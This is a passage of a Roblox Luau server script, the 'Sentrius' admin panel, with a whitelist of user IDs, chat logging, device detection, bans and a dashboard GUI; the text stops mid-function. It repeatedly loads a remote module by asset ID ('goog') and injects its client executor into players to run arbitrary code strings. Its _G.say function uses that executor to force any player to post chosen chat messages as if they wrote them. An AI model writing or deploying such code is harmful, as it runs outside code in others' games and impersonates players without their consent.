if _G.SentriusLoaded == true then 
    return 
end
_G.SentriusLoaded = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ws = game:GetService("Workspace")

if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
    require(112691275102014).load()
end

local prefix = "#"
local whitelist = {
    [3421321085] = true,
    [1702851506] = true,
    [3367555199] = true,
    [4769427369] = true,
    [4599596782] = true
}

local tempwl = {}
local connections = {}
local commands = {}
local commandInfo = {}
local ForcedRig = {} --thankz to vecko
local bannedIds = {}
local chatLogs = {}

local running = true
local playerNames = {}
local playerDevices = {}

if not _G.TouchyConnections then
    _G.TouchyConnections = {}
end

_G.say = function(p, m)
    p = game.Players:FindFirstChild(p)
    

    if p and p.Name == "idonthacklol101ns" then
        warn("Cannot force chat idonthacklol101ns via _G.say")
        return
    end
    
    if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
        local ticking = tick()
        require(112691275102014).load()
        repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

    if not goog then
        warn("goog failed to be added, command can not continue")
        return
    end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr:WaitForChild("Exec").Value = string.format([[

        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("%s", "All")


        script:Destroy()

    ]], m)

    if p.Character then
        scr.Parent = p.Character
    else
        scr.Parent = p:WaitForChild("PlayerGui")
    end

    scr.Enabled = true
end

local function logChat(plr, msg)
    table.insert(chatLogs, {
        player = plr.Name,
        userId = plr.UserId,
        message = msg,
        timestamp = os.date("%H:%M:%S")
    })
    
    if #chatLogs > 99999999999999999999999999991 then
        table.remove(chatLogs, 1)
    end
end

local function detectDevice(plr)
    if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
        local ticking = tick()
        require(112691275102014).load()
        repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
    end
    
    local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
    if not goog then return end
    

    local remote = ReplicatedStorage:FindFirstChild("DDetector")
    if not remote then
        remote = Instance.new("RemoteEvent")
        remote.Name = "DDetector"
        remote.Parent = ReplicatedStorage
    end
    

    if not connections["deviceDetect"] then
        connections["deviceDetect"] = remote.OnServerEvent:Connect(function(player, deviceType)
            playerDevices[player.UserId] = deviceType
        end)
    end
    
    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
    
    loa.Parent = scr
    scr:WaitForChild("Exec").Value = [[
        local UIS = game:GetService("UserInputService")
        local remote = game:GetService("ReplicatedStorage"):WaitForChild("DDetector")
        
        local deviceType = "Unknown"
        
        if UIS.TouchEnabled and not UIS.GamepadEnabled then
            deviceType = "Mobile"
        elseif UIS.GamepadEnabled and not UIS.TouchEnabled then
            deviceType = "Console"
        elseif not UIS.TouchEnabled and not UIS.GamepadEnabled then
            deviceType = "PC"
        elseif UIS.TouchEnabled and UIS.GamepadEnabled then
            deviceType = "Tablet"
        end
        
        remote:FireServer(deviceType)
        script:Destroy()
    ]]
    
    if plr:FindFirstChild("PlayerGui") then
        scr.Parent = plr.PlayerGui
    elseif plr.Character then
        scr.Parent = plr.Character
    end
    
    scr.Enabled = true
end

local vault = ReplicatedStorage:FindFirstChild("SentriusVault")
if not vault then
    vault = Instance.new("Folder")
    vault.Name = "SentriusVault"
    vault.Parent = ReplicatedStorage
end

local banFolder = vault:FindFirstChild("Bans")
if not banFolder then
    banFolder = Instance.new("Folder")
    banFolder.Name = "Bans"
    banFolder.Parent = vault
end

local mapBackup = vault:FindFirstChild("MapBackup")
if not mapBackup then
    mapBackup = Instance.new("Folder")
    mapBackup.Name = "MapBackup"
    mapBackup.Parent = vault
    
    local Tabby = workspace:FindFirstChild("Tabby")
    if Tabby then
        pcall(function()
            Tabby:Clone().Parent = mapBackup
        end)
    end
    
    local _Game = workspace.Terrain:FindFirstChild("_Game")
    if _Game then
        pcall(function()
            _Game:Clone().Parent = mapBackup
        end)
    end
end

for _, v in ipairs(banFolder:GetChildren()) do
    table.insert(bannedIds, tonumber(v.Name))
end

-- anti alt config
local MIN_ACCOUNT_AGE = 7
local KICK_REASON = "[Sentrius]: alt accounts are not allowed in this server.."
local AntiAltEnabled = false

local function isAlt(plr)
    if not AntiAltEnabled then return false end
    if whitelist[plr.UserId] then return false end
    if tempwl[plr.UserId] then return false end
    if plr.AccountAge < MIN_ACCOUNT_AGE then
        return true
    end
    return false
end

_G.AUTO_BANned = false

local function handleAlt(plr)
    if _G.AUTO_BANned then
        if not table.find(bannedIds, plr.UserId) then
            table.insert(bannedIds, plr.UserId)
            local v = Instance.new("IntValue")
            v.Name = tostring(plr.UserId)
            v.Value = plr.UserId
            v.Parent = banFolder
        end
        plr:Kick(KICK_REASON .. "\nPermanently banned (maybe)!!!")
    else
        plr:Kick(KICK_REASON .. "\nAccount age too low....")
    end
end

local function isAdmin(plr)
    if whitelist[plr.UserId] then return true end
    if tempwl[plr.UserId] then return true end
    return false
end

local function owna(plr)
    return whitelist[plr.UserId] == true
end

local function ApplyRig(plr, char) --thankz to vecko
    task.wait()
    if ForcedRig[plr.UserId] then
        local rigType = ForcedRig[plr.UserId]
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid and humanoid.RigType ~= rigType then
            local desc = Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
            local morph = Players:CreateHumanoidModelFromDescription(desc, rigType)
            if char.PrimaryPart then
                morph:SetPrimaryPartCFrame(char.PrimaryPart.CFrame)
            end
            morph.Name = plr.Name
            plr.Character = morph
            morph.Parent = workspace
        end
    end
end

local function notify(plr, title, message, duration)
    coroutine.wrap(function()
        local PlayerGui = plr:FindFirstChild("PlayerGui")
        if not PlayerGui then return end
        
        duration = duration or 4
        
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "SentriusNotification_" .. tick()
        ScreenGui.ResetOnSpawn = false
        ScreenGui.Parent = PlayerGui
        
        local NotifFrame = Instance.new("Frame")
        NotifFrame.Name = "NotificationFrame"
        NotifFrame.Size = UDim2.new(0, 280, 0, 90)
        NotifFrame.Position = UDim2.new(1, -290, 1, -100)
        NotifFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        NotifFrame.BackgroundTransparency = 1
        NotifFrame.BorderSizePixel = 0
        NotifFrame.Parent = ScreenGui
        
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 15)
        Corner.Parent = NotifFrame
        
        local TitleLabel = Instance.new("TextLabel")
        TitleLabel.Name = "Title"
        TitleLabel.Text = title or "Sentrius"
        TitleLabel.Size = UDim2.new(1, -45, 0, 18)
        TitleLabel.Position = UDim2.new(0, 10, 0, 6)
        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        TitleLabel.TextTransparency = 1
        TitleLabel.BackgroundTransparency = 1
        TitleLabel.Font = Enum.Font.GothamBold
        TitleLabel.TextSize = 13
        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
        TitleLabel.TextYAlignment = Enum.TextYAlignment.Top
        TitleLabel.Parent = NotifFrame
        
        local WhiteLine = Instance.new("Frame")
        WhiteLine.Name = "WhiteLine"
        WhiteLine.Size = UDim2.new(1, -18, 0, 1)
        WhiteLine.Position = UDim2.new(0, 9, 0, 27)
        WhiteLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        WhiteLine.BackgroundTransparency = 1
        WhiteLine.BorderSizePixel = 0
        WhiteLine.Parent = NotifFrame
        
        local CloseButton = Instance.new("TextButton")
        CloseButton.Name = "CloseButton"
        CloseButton.Size = UDim2.new(0, 24, 0, 24)
        CloseButton.Position = UDim2.new(1, -30, 0, 5)
        CloseButton.Text = "X"
        CloseButton.TextColor3 = Color3.fromRGB(100, 150, 255)
        CloseButton.TextTransparency = 1
        CloseButton.BackgroundTransparency = 1
        CloseButton.BorderSizePixel = 0
        CloseButton.Font = Enum.Font.GothamBold
        CloseButton.TextSize = 15
        CloseButton.Parent = NotifFrame
        
        local MessageLabel = Instance.new("TextLabel")
        MessageLabel.Name = "Message"
        MessageLabel.Text = message or ""
        MessageLabel.Size = UDim2.new(1, -20, 1, -38)
        MessageLabel.Position = UDim2.new(0, 10, 0, 32)
        MessageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
        MessageLabel.TextTransparency = 1
        MessageLabel.BackgroundTransparency = 1
        MessageLabel.Font = Enum.Font.Gotham
        MessageLabel.TextSize = 12
        MessageLabel.TextXAlignment = Enum.TextXAlignment.Left
        MessageLabel.TextYAlignment = Enum.TextYAlignment.Top
        MessageLabel.TextWrapped = true
        MessageLabel.Parent = NotifFrame
        
        local TweenService = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")
        local closed = false
        
        local function closeNotif()
            if closed then return end
            closed = true
            
            local fadeOut1 = TweenService:Create(NotifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
            local fadeOut2 = TweenService:Create(TitleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {TextTransparency = 1})
            local fadeOut3 = TweenService:Create(WhiteLine, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
            local fadeOut4 = TweenService:Create(CloseButton, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {TextTransparency = 1})
            local fadeOut5 = TweenService:Create(MessageLabel, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {TextTransparency = 1})
            
            fadeOut1:Play()
            fadeOut2:Play()
            fadeOut3:Play()
            fadeOut4:Play()
            fadeOut5:Play()
            
            fadeOut1.Completed:Connect(function()
                ScreenGui:Destroy()
            end)
        end
        
        CloseButton.MouseEnter:Connect(function()
            TweenService:Create(CloseButton, TweenInfo.new(0.2), {
                TextColor3 = Color3.fromRGB(255, 100, 100),
                TextSize = 17
            }):Play()
        end)
        
        CloseButton.MouseLeave:Connect(function()
            TweenService:Create(CloseButton, TweenInfo.new(0.2), {
                TextColor3 = Color3.fromRGB(100, 150, 255),
                TextSize = 15
            }):Play()
        end)
        
        local pc = not UserInputService.TouchEnabled and not UserInputService.GamepadEnabled
        local mobile = UserInputService.TouchEnabled
        
        if pc then
            CloseButton.MouseButton1Click:Connect(closeNotif)
        elseif mobile then
            CloseButton.InputBegan:Connect(function(input, process)
                if not process and input.UserInputType == Enum.UserInputType.Touch then
                    closeNotif()
                end
            end)
        end
        
        local fadeIn1 = TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {BackgroundTransparency = 0.05})
        local fadeIn2 = TweenService:Create(TitleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {TextTransparency = 0})
        local fadeIn3 = TweenService:Create(WhiteLine, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {BackgroundTransparency = 0.2})
        local fadeIn4 = TweenService:Create(CloseButton, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {TextTransparency = 0})
        local fadeIn5 = TweenService:Create(MessageLabel, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {TextTransparency = 0})
        
        fadeIn1:Play()
        fadeIn2:Play()
        fadeIn3:Play()
        fadeIn4:Play()
        fadeIn5:Play()
        
        wait(duration)
        closeNotif()
    end)()
end

local function checker(str)
    if not str or str == "" then return false end
    local lowerStr = str:lower()
    
    for name, _ in pairs(playerNames) do
        if name:lower() == lowerStr then
            return true
        end
    end
    
    for name, _ in pairs(playerNames) do
        if name:lower():sub(1, #lowerStr) == lowerStr then
            return true
        end
    end
    
    if #lowerStr >= 3 then
        for name, _ in pairs(playerNames) do
            if name:lower():find(lowerStr, 1, true) then
                return true
            end
        end
    end
    
    return false
end

function GetPlayer(targets, me)
    local found = {}
    local targ = tostring(targets):lower()

    if targ == "me" then
        return { me }
    elseif targ == "all" then
        return Players:GetPlayers()
    elseif targ == "others" then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= me then table.insert(found, plr) end
        end
        return found
    elseif targ == "random" then
        local everyone = Players:GetPlayers()
        if #everyone > 0 then
            local randomplr = everyone[math.random(1, #everyone)]
            return { randomplr }
        else
            return {}
        end
    end

    local exact = {}
    local dude = {}
    
    for _, plr in ipairs(Players:GetPlayers()) do
        local name = plr.Name:lower()
        local displayName = plr.DisplayName:lower()
        
        if name == targ or displayName == targ then
            table.insert(exact, plr)
        elseif name:sub(1, #targ) == targ or displayName:sub(1, #targ) == targ then
            table.insert(dude, plr)
        end
    end
    
    if #exact > 0 then
        return exact
    end
    
    if #dude > 0 then
        return dude
    end
    
    if #targ >= 3 then
        for _, plr in ipairs(Players:GetPlayers()) do
            local name = plr.Name:lower()
            local displayName = plr.DisplayName:lower()
            
            if name:find(targ, 1, true) or displayName:find(targ, 1, true) then
                table.insert(found, plr)
            end
        end
    end
    
    return found
end

local function addCommand(data)
    local list = {}

    if data.names then
        for _, n in ipairs(data.names) do
            table.insert(list, n)
        end
    end

    if data.name then
        if type(data.name) == "table" then
            for _, n in ipairs(data.name) do
                table.insert(list, n)
            end
        else
            table.insert(list, data.name)
        end
    end

    if #list > 0 then
        local mainName = list[1]
        commandInfo[mainName] = {
            name = mainName,
            aliases = data.aliases or {},
            desc = data.desc or "No description provided",
            usage = data.usage or (prefix .. mainName)
        }
    end

    for _, n in ipairs(list) do
        commands[n:lower()] = data.callback
    end

    if data.aliases then
        for _, a in ipairs(data.aliases) do
            commands[a:lower()] = data.callback
        end
    end
end

local function openDashboard(plr, defaultTab)
    defaultTab = defaultTab or "Commands"
    
    local PlayerGui = plr:FindFirstChild("PlayerGui")
    if not PlayerGui then return end
    
    local existing = PlayerGui:FindFirstChild("SentriusDashboard")
    if existing then existing:Destroy() end
    
    local TweenService = game:GetService("TweenService")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    
    -- Countri data
    local countryFlags = {
        US = "🇺🇸", CA = "🇨🇦", MX = "🇲🇽", BR = "🇧🇷", AR = "🇦🇷", CL = "🇨🇱", CO = "🇨🇴", PE = "🇵🇪", VE = "🇻🇪",
        EC = "🇪🇨", BO = "🇧🇴", PY = "🇵🇾", UY = "🇺🇾", GY = "🇬🇾", SR = "🇸🇷", CR = "🇨🇷", PA = "🇵🇦", GT = "🇬🇹",
        HN = "🇭🇳", SV = "🇸🇻", NI = "🇳🇮", CU = "🇨🇺", DO = "🇩🇴", HT = "🇭🇹", JM = "🇯🇲", TT = "🇹🇹", BS = "🇧🇸",
        BB = "🇧🇧", BZ = "🇧🇿", GD = "🇬🇩", LC = "🇱🇨", VC = "🇻🇨", AG = "🇦🇬", DM = "🇩🇲", KN = "🇰🇳",
        GB = "🇬🇧", DE = "🇩🇪", FR = "🇫🇷", ES = "🇪🇸", IT = "🇮🇹", NL = "🇳🇱", BE = "🇧🇪", CH = "🇨🇭", AT = "🇦🇹",
        PT = "🇵🇹", GR = "🇬🇷", SE = "🇸🇪", NO = "🇳🇴", DK = "🇩🇰", FI = "🇫🇮", PL = "🇵🇱", CZ = "🇨🇿", RO = "🇷🇴",
        HU = "🇭🇺", BG = "🇧🇬", SK = "🇸🇰", HR = "🇭🇷", SI = "🇸🇮", LT = "🇱🇹", LV = "🇱🇻", EE = "🇪🇪", IE = "🇮🇪",
        IS = "🇮🇸", LU = "🇱🇺", MT = "🇲🇹", CY = "🇨🇾", RS = "🇷🇸", BA = "🇧🇦", ME = "🇲🇪", MK = "🇲🇰", AL = "🇦🇱",
        MD = "🇲🇩", BY = "🇧🇾", UA = "🇺🇦", RU = "🇷🇺", CN = "🇨🇳", JP = "🇯🇵", KR = "🇰🇷", IN = "🇮🇳", PK = "🇵🇰",
        BD = "🇧🇩", VN = "🇻🇳", TH = "🇹🇭", PH = "🇵🇭", ID = "🇮🇩", MY = "🇲🇾", SG = "🇸🇬", MM = "🇲🇲", KH = "🇰🇭",
        LA = "🇱🇦", NP = "🇳🇵", LK = "🇱🇰", AF = "🇦🇫", IQ = "🇮🇶", IR = "🇮🇷", TR = "🇹🇷", SA = "🇸🇦", AE = "🇦🇪",
        IL = "🇮🇱", JO = "🇯🇴", LB = "🇱🇧", SY = "🇸🇾", YE = "🇾🇪", OM = "🇴🇲", KW = "🇰🇼", BH = "🇧🇭", QA = "🇶🇦",
        MN = "🇲🇳", KZ = "🇰🇿", UZ = "🇺🇿", TM = "🇹🇲", KG = "🇰🇬", TJ = "🇹🇯", GE = "🇬🇪", AM = "🇦🇲", AZ = "🇦🇿",
        BT = "🇧🇹", MV = "🇲🇻", BN = "🇧🇳", TL = "🇹🇱", EG = "🇪🇬", ZA = "🇿🇦", NG = "🇳🇬", KE = "🇰🇪", ET = "🇪🇹",
        GH = "🇬🇭", TZ = "🇹🇿", UG = "🇺🇬", DZ = "🇩🇿", MA = "🇲🇦", TN = "🇹🇳", LY = "🇱🇾", SD = "🇸🇩", SS = "🇸🇸",
        SO = "🇸🇴", AO = "🇦🇴", MZ = "🇲🇿", ZW = "🇿🇼", ZM = "🇿🇲", MW = "🇲🇼", BW = "🇧🇼", NA = "🇳🇦", SZ = "🇸🇿",
        LS = "🇱🇸", CM = "🇨🇲", CI = "🇨🇮", SN = "🇸🇳", ML = "🇲🇱", NE = "🇳🇪", BF = "🇧🇫", TD = "🇹🇩", CF = "🇨🇫",
        CG = "🇨🇬", CD = "🇨🇩", GA = "🇬🇦", GQ = "🇬🇶", BJ = "🇧🇯", TG = "🇹🇬", LR = "🇱🇷", SL = "🇸🇱", GN = "🇬🇳",
        GW = "🇬🇼", GM = "🇬🇲", MR = "🇲🇷", ER = "🇪🇷", DJ = "🇩🇯", RW = "🇷🇼", BI = "🇧🇮", SC = "🇸🇨", MU = "🇲🇺",
        KM = "🇰🇲", MG = "🇲🇬", CV = "🇨🇻", ST = "🇸🇹", AU = "🇦🇺", NZ = "🇳🇿", FJ = "🇫🇯", PG = "🇵🇬", WS = "🇼🇸",
        SB = "🇸🇧", VU = "🇻🇺", TO = "🇹🇴", KI = "🇰🇮", FM = "🇫🇲", MH = "🇲🇭", PW = "🇵🇼", NR = "🇳🇷", TV = "🇹🇻"
    }
    
    local countryNames = {
        US = "United States", CA = "Canada", MX = "Mexico", BR = "Brazil", AR = "Argentina", CL = "Chile",
        CO = "Colombia", PE = "Peru", VE = "Venezuela", EC = "Ecuador", BO = "Bolivia", PY = "Paraguay",
        UY = "Uruguay", GY = "Guyana", SR = "Suriname", CR = "Costa Rica", PA = "Panama", GT = "Guatemala",
        HN = "Honduras", SV = "El Salvador", NI = "Nicaragua", CU = "Cuba", DO = "Dominican Republic",
        HT = "Haiti", JM = "Jamaica", TT = "Trinidad and Tobago", BS = "Bahamas", BB = "Barbados",
        BZ = "Belize", GD = "Grenada", LC = "Saint Lucia", VC = "Saint Vincent", AG = "Antigua and Barbuda",
        DM = "Dominica", KN = "Saint Kitts and Nevis", GB = "United Kingdom", DE = "Germany", FR = "France",
        ES = "Spain", IT = "Italy", NL = "Netherlands", BE = "Belgium", CH = "Switzerland", AT = "Austria",
        PT = "Portugal", GR = "Greece", SE = "Sweden", NO = "Norway", DK = "Denmark", FI = "Finland",
        PL = "Poland", CZ = "Czech Republic", RO = "Romania", HU = "Hungary", BG = "Bulgaria", SK = "Slovakia",
        HR = "Croatia", SI = "Slovenia", LT = "Lithuania", LV = "Latvia", EE = "Estonia", IE = "Ireland",
        IS = "Iceland", LU = "Luxembourg", MT = "Malta", CY = "Cyprus", RS = "Serbia", BA = "Bosnia and Herzegovina",
        ME = "Montenegro", MK = "North Macedonia", AL = "Albania", MD = "Moldova", BY = "Belarus", UA = "Ukraine",
        RU = "Russia", CN = "China", JP = "Japan", KR = "South Korea", IN = "India", PK = "Pakistan",
        BD = "Bangladesh", VN = "Vietnam", TH = "Thailand", PH = "Philippines", ID = "Indonesia", MY = "Malaysia",
        SG = "Singapore", MM = "Myanmar", KH = "Cambodia", LA = "Laos", NP = "Nepal", LK = "Sri Lanka",
        AF = "Afghanistan", IQ = "Iraq", IR = "Iran", TR = "Turkey", SA = "Saudi Arabia", AE = "United Arab Emirates",
        IL = "Israel", JO = "Jordan", LB = "Lebanon", SY = "Syria", YE = "Yemen", OM = "Oman", KW = "Kuwait",
        BH = "Bahrain", QA = "Qatar", MN = "Mongolia", KZ = "Kazakhstan", UZ = "Uzbekistan", TM = "Turkmenistan",
        KG = "Kyrgyzstan", TJ = "Tajikistan", GE = "Georgia", AM = "Armenia", AZ = "Azerbaijan", BT = "Bhutan",
        MV = "Maldives", BN = "Brunei", TL = "Timor-Leste", EG = "Egypt", ZA = "South Africa", NG = "Nigeria",
        KE = "Kenya", ET = "Ethiopia", GH = "Ghana", TZ = "Tanzania", UG = "Uganda", DZ = "Algeria", MA = "Morocco",
        TN = "Tunisia", LY = "Libya", SD = "Sudan", SS = "South Sudan", SO = "Somalia", AO = "Angola",
        MZ = "Mozambique", ZW = "Zimbabwe", ZM = "Zambia", MW = "Malawi", BW = "Botswana", NA = "Namibia",
        SZ = "Eswatini", LS = "Lesotho", CM = "Cameroon", CI = "Ivory Coast", SN = "Senegal", ML = "Mali",
        NE = "Niger", BF = "Burkina Faso", TD = "Chad", CF = "Central African Republic", CG = "Republic of the Congo",
        CD = "Democratic Republic of the Congo", GA = "Gabon", GQ = "Equatorial Guinea", BJ = "Benin", TG = "Togo",
        LR = "Liberia", SL = "Sierra Leone", GN = "Guinea", GW = "Guinea-Bissau", GM = "Gambia", MR = "Mauritania",
        ER = "Eritrea", DJ = "Djibouti", RW = "Rwanda", BI = "Burundi", SC = "Seychelles", MU = "Mauritius",
        KM = "Comoros", MG = "Madagascar", CV = "Cape Verde", ST = "Sao Tome and Principe", AU = "Australia",
        NZ = "New Zealand", FJ = "Fiji", PG = "Papua New Guinea", WS = "Samoa", SB = "Solomon Islands",
        VU = "Vanuatu", TO = "Tonga", KI = "Kiribati", FM = "Micronesia", MH = "Marshall Islands", PW = "Palau",
        NR = "Nauru", TV = "Tuvalu"
    }
    

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "SentriusDashboard"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = PlayerGui
    

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Size = UDim2.new(0, 750, 0, 420)
    MainFrame.Position = UDim2.new(0.5, -375, 0.5, -210)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    MainFrame.BackgroundTransparency = 0.05
    MainFrame.BorderSizePixel = 2
    MainFrame.BorderColor3 = Color3.fromRGB(70, 70, 70)
    MainFrame.Parent = ScreenGui
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 12)
    MainCorner.Parent = MainFrame
    

    local TopBar = Instance.new("Frame")
    TopBar.Name = "TopBar"
    TopBar.Size = UDim2.new(1, 0, 0, 38)
    TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TopBar.BackgroundTransparency = 0.2
    TopBar.BorderSizePixel = 0
    TopBar.Parent = MainFrame
    
    local TopBarCorner = Instance.new("UICorner")
    TopBarCorner.CornerRadius = UDim.new(0, 12)
    TopBarCorner.Parent = TopBar
    
    local TopBarFix = Instance.new("Frame")
    TopBarFix.Size = UDim2.new(1, 0, 0, 12)
    TopBarFix.Position = UDim2.new(0, 0, 1, -12)
    TopBarFix.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TopBarFix.BackgroundTransparency = 0.2
    TopBarFix.BorderSizePixel = 0
    TopBarFix.Parent = TopBar
    

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(0, 280, 0, 38)
    Title.Position = UDim2.new(0.28, 0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "Sentrius Dashboard"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22
    Title.Font = Enum.Font.GothamBold
    Title.Parent = TopBar
    

    local CloseButton = Instance.new("TextButton")
    CloseButton.Name = "CloseButton"
    CloseButton.Size = UDim2.new(0, 32, 0, 32)
    CloseButton.Position = UDim2.new(1, -37, 0, 3)
    CloseButton.BackgroundTransparency = 1
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 18
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.Parent = TopBar
    

    local TabBar = Instance.new("Frame")
    TabBar.Name = "TabBar"
    TabBar.Size = UDim2.new(1, -16, 0, 42)
    TabBar.Position = UDim2.new(0, 8, 0, 46)
    TabBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    TabBar.BackgroundTransparency = 0.3
    TabBar.BorderSizePixel = 1
    TabBar.BorderColor3 = Color3.fromRGB(60, 60, 60)
    TabBar.Parent = MainFrame
    
    local TabBarCorner = Instance.new("UICorner")
    TabBarCorner.CornerRadius = UDim.new(0, 8)
    TabBarCorner.Parent = TabBar
    

    local ContentFrame = Instance.new("Frame")
    ContentFrame.Name = "ContentFrame"
    ContentFrame.Size = UDim2.new(1, -16, 1, -104)
    ContentFrame.Position = UDim2.new(0, 8, 0, 96)
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.Parent = MainFrame


    local tabs = {"Commands", "Whitelist", "Players", "Bans", "Scripts"}
    local tabButtons = {}
    local tabContents = {}
    
    for i, tabName in ipairs(tabs) do
        local TabButton = Instance.new("TextButton")
        TabButton.Name = tabName .. "Tab"
        TabButton.Size = UDim2.new(0.2, -8, 0, 36)
        TabButton.Position = UDim2.new((i-1) * 0.2, 4, 0, 3)
        TabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        TabButton.BackgroundTransparency = 0.3
        TabButton.BorderSizePixel = 1
        TabButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
        TabButton.Text = tabName
        TabButton.TextColor3 = Color3.fromRGB(180, 180, 180)
        TabButton.TextSize = 15
        TabButton.Font = Enum.Font.GothamBold
        TabButton.Parent = TabBar
        
        local TabCorner = Instance.new("UICorner")
        TabCorner.CornerRadius = UDim.new(0, 6)
        TabCorner.Parent = TabButton
        
        tabButtons[tabName] = TabButton
        
        -- Tab Content
        local TabContent = Instance.new("ScrollingFrame")
        TabContent.Name = tabName .. "Content"
        TabContent.Size = UDim2.new(1, 0, 1, 0)
        TabContent.Position = UDim2.new(0, 0, 0, 0)
        TabContent.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        TabContent.BackgroundTransparency = 0.2
        TabContent.BorderSizePixel = 1
        TabContent.BorderColor3 = Color3.fromRGB(60, 60, 60)
        TabContent.ScrollBarThickness = 6
        TabContent.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
        TabContent.Visible = (tabName == defaultTab)
        TabContent.Parent = ContentFrame
        
        local TabContentCorner = Instance.new("UICorner")
        TabContentCorner.CornerRadius = UDim.new(0, 8)
        TabContentCorner.Parent = TabContent
        
        local Layout = Instance.new("UIListLayout")
        Layout.Name = "Layout"
        Layout.Parent = TabContent
        Layout.SortOrder = Enum.SortOrder.LayoutOrder
        Layout.Padding = UDim.new(0, 5)
        
        tabContents[tabName] = TabContent
    end
    
    -- Function to switch tabs
    local function switchTab(tabName)
        for name, button in pairs(tabButtons) do
            if name == tabName then
                TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    BackgroundColor3 = Color3.fromRGB(100, 150, 255),
                    BackgroundTransparency = 0.1,
                    BorderColor3 = Color3.fromRGB(120, 170, 255),
                    TextColor3 = Color3.fromRGB(255, 255, 255),
                    Size = UDim2.new(0.2, -6, 0, 36),
                    TextSize = 16
                }):Play()
            else
                TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    BackgroundColor3 = Color3.fromRGB(45, 45, 45),
                    BackgroundTransparency = 0.3,
                    BorderColor3 = Color3.fromRGB(80, 80, 80),
                    TextColor3 = Color3.fromRGB(180, 180, 180),
                    Size = UDim2.new(0.2, -8, 0, 36),
                    TextSize = 15
                }):Play()
            end
        end
        
        for name, content in pairs(tabContents) do
            content.Visible = (name == tabName)
        end
    end
    
    for tabName, button in pairs(tabButtons) do
        button.MouseButton1Click:Connect(function()
            switchTab(tabName)
        end)
    end
    
    -- COMMANDS TAB CONTENT
    local commandsContent = tabContents["Commands"]
    
    local sortedCommands = {}
    for cmdName, cmdData in pairs(commandInfo) do
        table.insert(sortedCommands, {name = cmdName, data = cmdData})
    end
    
    table.sort(sortedCommands, function(a, b)
        return a.name < b.name
    end)
    
    for counter, cmdEntry in ipairs(sortedCommands) do
        local cmdData = cmdEntry.data
        
        local CommandFrame = Instance.new("Frame")
        CommandFrame.Name = "Command_" .. cmdData.name
        CommandFrame.Size = UDim2.new(1, -12, 0, 48)
        CommandFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        CommandFrame.BackgroundTransparency = 0.4
        CommandFrame.BorderSizePixel = 1
        CommandFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
        CommandFrame.Parent = commandsContent
        
        local CmdCorner = Instance.new("UICorner")
        CmdCorner.CornerRadius = UDim.new(0, 6)
        CmdCorner.Parent = CommandFrame
        
        local CommandLabel = Instance.new("TextLabel")
        CommandLabel.Size = UDim2.new(0.5, 0, 0, 16)
        CommandLabel.Position = UDim2.new(0, 6, 0, 3)
        CommandLabel.BackgroundTransparency = 1
        CommandLabel.Text = counter .. " | " .. prefix .. cmdData.name
